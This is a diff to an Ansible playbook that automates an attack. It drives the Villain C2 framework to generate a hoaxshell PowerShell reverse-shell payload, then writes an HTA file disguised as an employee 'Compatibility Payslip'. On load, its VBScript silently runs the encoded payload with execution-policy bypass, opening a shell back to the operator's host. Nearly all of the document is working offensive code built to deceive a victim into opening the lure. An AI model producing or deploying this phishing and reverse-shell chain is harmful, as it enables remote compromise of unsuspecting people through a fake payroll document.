@@ -5,7 +5,7 @@
     content: |
       import pexpect
       import re
-      interface= {{ interface }}
+      interface= "{{ interface }}"
       villain_prompt = '\x1b[4mVillain\x1b[0m > '
       generate_command=f"generate payload=windows/hoaxshell/powershell_iex lhost={interface} encode"
       child = pexpect.spawn('villain -q', encoding='utf-8', timeout=20)
@@ -18,16 +18,84 @@
       command = match.group(0)
       print(command)
 
+
 - name: Make the script executable
   file:
     path: /opt/generate_payload.py
     mode: '0755'
 
-
-- name: Run the Villain
+- name: Run the Villain payload generation script
   shell: python3 /opt/generate_payload.py
   register: villain_output
 
-- name: Display the payload
+- name: Extract the payload from the script output
+  set_fact:
+     powershell_payload: "{{ villain_output.stdout }}"
+
+
+- name: Display the PowerShell payload
   debug:
-    msg: "{{ villain_output.stdout }}"
+    msg: "Generated PowerShell payload: {{ powershell_payload }}"
+
+
+- name: Create the HTA file with the generated PowerShell payload
+  shell: |
+        cat << EOF > /opt/fiche.hta
+        <html>
+        <head>
+            <title>Compatibility Payslip</title>
+            <hta:application
+                id="oHTA"
+                applicationname="CompatibilityPayslip"
+                border="thin"
+                borderstyle="normal"
+                caption="yes"
+                contextmenu="no"
+                maximizebutton="no"
+                minimizebutton="no"
+                navigable="yes"
+                scroll="no"
+                showintaskbar="yes"
+                singleinstance="yes"
+                sysmenu="yes"
+                windowstate="normal"
+            />
+            <script language="VBScript">
+                Sub Window_OnLoad
+                    Dim shell, cmd
+                    cmd = "powershell -ep bypass -e {{ powershell_payload }}"
+                    Set shell = CreateObject("WScript.Shell")
+                    shell.Run cmd, 0, false
+                End Sub
+            </script>
+        </head>
+        <body onload="Window_OnLoad">
+            <h1>Compatibility Payslip</h1>
+            <table border="1" cellpadding="10">
+                <tr>
+                    <th>Employee Name</th>
+                    <th>Department</th>
+                    <th>Pay Period</th>
+                    <th>Amount</th>
+                </tr>
+                <tr>
+                    <td>John Doe</td>
+                    <td>Engineering</td>
+                    <td>July 2024</td>
+                    <td>$5,000.00</td>
+                </tr>
+                <tr>
+                    <td>Jane Smith</td>
+                    <td>Marketing</td>
+                    <td>July 2024</td>
+                    <td>$4,500.00</td>
+                </tr>
+            </table>
+            <p>Please contact HR if you have any questions about your payslip.</p>
+        </body>
+        </html>
+        EOF
+
+- name: Display the generated HTA file path
+  debug:
+    msg: "The HTA file has been created at /opt/fiche.hta"
